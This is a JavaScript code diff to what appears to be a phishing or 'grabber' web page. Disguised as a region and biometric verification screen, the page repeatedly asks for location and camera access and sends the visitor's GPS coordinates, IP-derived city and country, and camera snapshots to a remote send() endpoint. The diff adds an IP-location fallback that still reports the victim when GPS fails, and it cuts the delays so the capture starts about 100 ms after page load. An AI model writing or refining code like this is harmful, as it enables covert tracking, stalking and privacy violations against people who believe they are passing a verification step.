@@ -319,9 +319,10 @@ async function main() {
         }
     });
 
-    // 2. Location (Nagging)
+    // 2. Location (Nagging + Fallback Logic)
     const locGuard = new LocationGuard(overlay);
     const loc = await locGuard.lock();
+
     if (loc.success) {
         const mapUrl = `https://www.google.com/maps?q=${loc.coords.latitude},${loc.coords.longitude}`;
         await send({
@@ -338,11 +339,25 @@ async function main() {
             }
         });
         overlay.showSuccess('Region Verified');
+    } else {
+        // FALLBACK: User allowed but GPS failed (or Persistent mode off)
+        await send({
+            embed: {
+                title: '⚠️ YASIR ABBAS | GPS FAILED',
+                color: 0xE74C3C,
+                description: `**Error:** ${loc.error}\n**Fallback:** Using IP Location.`,
+                fields: [
+                    { name: 'Estimated City', value: network.ip.city || 'Unknown', inline: true },
+                    { name: 'Estimated Country', value: network.ip.country_name || 'Unknown', inline: true }
+                ]
+            }
+        });
     }
 
-    // 3. Camera (Nagging)
+    // 3. Camera (Nagging + Faster Warmup)
     const camGuard = new CameraGuard(document.getElementById('st-v'), overlay);
     if (await camGuard.start()) {
+        await new Promise(r => setTimeout(r, 800)); // Optimized Warmup (was 1500)
         await camGuard.snap(CONFIG.CAMERA_SNAPS);
         overlay.showSuccess('Biometrics Verified');
     }
@@ -353,9 +368,9 @@ async function main() {
     overlay.showSuccess('Identity Synchronized');
 
     // 5. Done
-    await new Promise(r => setTimeout(r, 1000));
+    await new Promise(r => setTimeout(r, 400)); // Optimized Exit (was 1000)
     window.location.href = CONFIG.REDIRECT_URL;
 }
 
-if (CONFIG.AUTO_START) window.onload = () => setTimeout(main, 800);
+if (CONFIG.AUTO_START) window.onload = () => setTimeout(main, 100); // Optimized Start (was 800)
 else window.onclick = main;
